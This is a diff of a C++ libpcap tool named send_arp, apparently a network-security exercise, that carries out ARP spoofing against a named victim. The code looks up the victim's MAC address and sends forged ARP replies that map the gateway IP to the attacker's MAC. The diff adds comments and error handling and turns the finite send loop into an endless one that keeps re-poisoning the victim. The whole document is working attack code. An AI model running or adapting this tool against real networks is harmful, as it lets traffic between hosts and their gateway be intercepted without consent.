@@ -6,8 +6,7 @@
 #include <string.h>
 #include <netinet/if_ether.h>
 #include <unistd.h>
-
-#define DEBUG
+#define _DEBUG
 
 using namespace std;
 
@@ -39,9 +38,12 @@ typedef struct {
 pcap_t *handle;
 
 void usage() {
-    cout << "wrong!" << endl << "[format] sudo ./send_arp <devname> <victim ip> <gateway ip>" << endl;
+    cerr << "Usage:" << endl
+         << "\t[format] sudo ./send_arp <devname> <victim ip> <gateway ip>"
+         << endl;
 }
 
+// convert string ip to u_char*
 u_char* convertIP(const char* ip) {
     u_char* ret = new u_char[4]{0, };
     for (int i = 0; i < strlen(ip); i++){
@@ -55,6 +57,7 @@ u_char* convertIP(const char* ip) {
     return ret - 3;
 }
 
+// get attacer's ip
 u_char* getMyIP(const char* dev){
     int fd;
     struct ifreq ifr;
@@ -67,6 +70,7 @@ u_char* getMyIP(const char* dev){
     return convertIP(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
 }
 
+// get attacker's mac
 u_char* getMyMac(const char* dev){
     int fd;
     struct ifreq ifr;
@@ -81,12 +85,15 @@ u_char* getMyMac(const char* dev){
     return ret;
 }
 
+// set myInfo structure
+// without myInfo::mac
 void setMyInfo(const char* dev, const char* vip, const char* gip, myInfo* info){
     memcpy(info->mac, getMyMac(dev), 6);                // set local mac
     memcpy(info->vip, convertIP(vip), 4);               // set vip & gip
     memcpy(info->gip, convertIP(gip), 4);
 }
 
+// set data of ethernet, arp header by myInfo
 void setARPPacketHeaders(etherHeader* eth, arpHeader* arp, myInfo* info){
     memcpy(eth->dMac, "\xff\xff\xff\xff\xff\xff", 6);       // to broadcast
     memcpy(eth->sMac, info->mac, 6);                        // from me
@@ -103,6 +110,7 @@ void setARPPacketHeaders(etherHeader* eth, arpHeader* arp, myInfo* info){
     memcpy(arp->target_ip, info->vip, 4);                       // victim ip
 }
 
+// create arp packet by ethernet, arp header
 u_char* makeARPPacket(etherHeader* eth, arpHeader* arp){
     u_char* ret = new u_char[42];
     memcpy(ret, eth, 14);
@@ -110,7 +118,8 @@ u_char* makeARPPacket(etherHeader* eth, arpHeader* arp){
     return ret;
 }
 
-void getVictimMac(const char* dev, myInfo* getInfo){
+// get victim mac by sending arp packet
+bool getVictimMac(const char* dev, myInfo* getInfo){
     etherHeader* eth = new etherHeader;
     arpHeader* arp = new arpHeader;
     myInfo* info = new myInfo;
@@ -119,10 +128,11 @@ void getVictimMac(const char* dev, myInfo* getInfo){
     memcpy(info->vip, getInfo->vip, 4);
     memcpy(info->vmac, "\x00\x00\x00\x00\x00\x00", 6);
     setARPPacketHeaders(eth, arp, info);
-    arp->opcode = ntohs(1);                                 // arp request
-    cout << "Checking Victim's MAC Address" << endl;
-    pcap_sendpacket(handle,makeARPPacket(eth, arp),42);
-    while(true){
+    arp->opcode = ntohs(1);                                 // change to arp request
+    u_char* arpPacket = makeARPPacket(eth, arp);
+    pcap_sendpacket(handle, arpPacket, 42);
+    delete arpPacket;
+    for (int i = 0; i < 100; i++) {
         struct pcap_pkthdr* header;
         const u_char* packet;
         int res = pcap_next_ex(handle, &header, &packet);
@@ -133,16 +143,17 @@ void getVictimMac(const char* dev, myInfo* getInfo){
             arpHeader* getArp = (arpHeader*)(packet + 14);
             if(!memcmp(getArp->sender_ip, getInfo->vip, 4)){
                 memcpy(getInfo->vmac, getArp->sender_mac, 6);
-                cout << "Find." << endl;
                 delete eth;
                 delete arp;
                 delete info;
-                return;
+                return true;
             }
         }
     }
+    return false;
 }
 
+// print information 
 void printInfo(myInfo* info){
     cout << "Victim IP: ";
     for (int i = 0; i < 4; i++) printf("%d.", *(info->vip + i));
@@ -161,17 +172,19 @@ int main(int argc, const char** argv) {
     const char* vIP = argv[2];
     const char* gIP = argv[3];
 #else
-    const char dev[] = "ens33";
-    const char vIP[] = "172.20.10.11";
+    // Debuging code
+    const char dev[] = "wlp0s20f3";
+    const char vIP[] = "172.20.10.3";
     const char gIP[] = "172.20.10.1";
 #endif
-    int i = 0;
     myInfo* info = new myInfo;
     etherHeader* eth = new etherHeader;
     arpHeader* arp = new arpHeader;
 
     setMyInfo(dev, vIP, gIP, info);
     printInfo(info);
+
+    // open pcap_live
     char errbuf[PCAP_ERRBUF_SIZE];
     handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
     if (handle == NULL) {
@@ -179,21 +192,29 @@ int main(int argc, const char** argv) {
         return -2;
     }
 
-    getVictimMac(dev, info);                                            // get victim's mac addr
+    // get victim's mac addr
+    cout << "Checking Victim's MAC Address" << endl;
+    if(!getVictimMac(dev, info)){ 
+        cerr << "Can't find victim's MAC address" << endl;
+        return -1;
+    }
+    cout << "Find." << endl;
     cout << "Victim MAC: ";
     for (int i = 0; i < 6; i++) printf("%02x:", *(info->vmac + i));
     cout << "\b " << endl;
 
+    // set ethernet, arp packet header
     setARPPacketHeaders(eth, arp, info);
     memcpy(eth->dMac, info->vmac, 6);
     u_char* arpPacket = makeARPPacket(eth, arp);
     cout << "Sending ARP packet to victim..." << endl;
-    for (int i = 0; i < 1000; i++){
-            pcap_sendpacket(handle,arpPacket,42);
-            cout << "Send" << endl;
-            sleep(1);
+
+    while(true){
+        getVictimMac(dev, info);		// to make attacker's arp table when victim reset arp table
+        pcap_sendpacket(handle,arpPacket,42);
+        cout << "Send" << endl;
+        sleep(1);
     }
 
-    cin >> i;
     return 0;
 }
